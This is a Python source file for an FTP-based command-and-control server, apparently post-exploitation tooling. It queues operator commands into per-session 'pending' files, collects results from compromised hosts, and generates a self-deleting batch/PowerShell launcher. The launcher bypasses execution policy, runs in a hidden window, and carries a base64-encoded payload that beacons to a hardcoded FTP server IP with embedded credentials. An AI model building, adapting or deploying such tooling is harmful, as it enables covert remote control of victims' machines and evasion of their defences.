from uuid import uuid4
from typing import Dict, List, Tuple
from base64 import b64encode
import logging
import os

class FTPC2:
    root_dir: str = None

    def __init__(self, root_dir: str, creds: List[Dict]) -> None:
        self.root_dir = root_dir
        self.creds = creds
        self.session_cnt = {}
        self.__create_root()

    def gen_session(self) -> Tuple[str, str]:
        while True:
            session = str(uuid4())
            if self.__session_exists(session):
                logging.warn(f"Session {session} already exists, trying new one")
            else:
                session_dir = os.path.join(self.root_dir, session)
                os.makedirs(session_dir)
                self.__create_sess_dir(session_dir)
                filename = self.__gen_launcher(session)

                logging.info(f"Session created: {session}")
                return session, filename

    def write_pending(self, session: str, cmd: str) -> int:
        if not self.__session_exists(session):
            return -1
        else:
            session_cnt = self.session_cnt.get(session, 0)
            fname = f'{self.root_dir}/{session}/pending/{session_cnt}'
            with open(fname, 'w') as f:
                f.write(cmd)
            self.session_cnt[session] = session_cnt+1
            return session_cnt

    def get_result(self, session: str, rid: int) -> str:
        if not self.__session_exists(session):
            return '[ERROR] Session does not exist'
        else:
            fname = f'{self.root_dir}/{session}/result/{rid}'
            try:
                with open(fname, 'r') as f:
                    result = f.read()
                    return result
            except IOError:
                return '[ERROR] File ID does not exist'

    def __session_exists(self, session: str) -> bool:
        path = os.path.join(self.root_dir, session)
        if os.path.exists(path): return True
        else: return False
        

    def __create_sess_dir(self, sroot: str) -> None:
        result = os.path.join(sroot, 'result')
        pending = os.path.join(sroot, 'pending')
        os.makedirs(result)
        os.makedirs(pending)

    def __create_root(self) -> None:
        if os.path.exists(self.root_dir):
            logging.info("FTP directory exists, using old directory")
        else:
            logging.info(f"Missing FTP directory, creating directory {self.root_dir}")
            os.makedirs(self.root_dir)

    def __gen_launcher(self, session: str) -> None:
        with open('launcher_template.ps1') as f:
            launcher = f.read()
        launcher = launcher.format(server='ftp://140.113.195.171/',
                                   username=self.creds[0]['user'],
                                   password=self.creds[0]['pass'],
                                   session=f'{session}',
                                   beacon=5)
        enc_launcher = b64encode(launcher.encode("UTF-16LE")).decode()
        launcher_file = 'launcher.bat'
        with open(launcher_file, 'w') as f:
            f.write('# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText(\'%~f0\')|iex" & DEL "%~f0" & POPD /B\n')
            f.write(f'powershell -noP -sta -w 1 -enc {enc_launcher}')
        logging.info(f"File created: {launcher_file}")
        return launcher_file
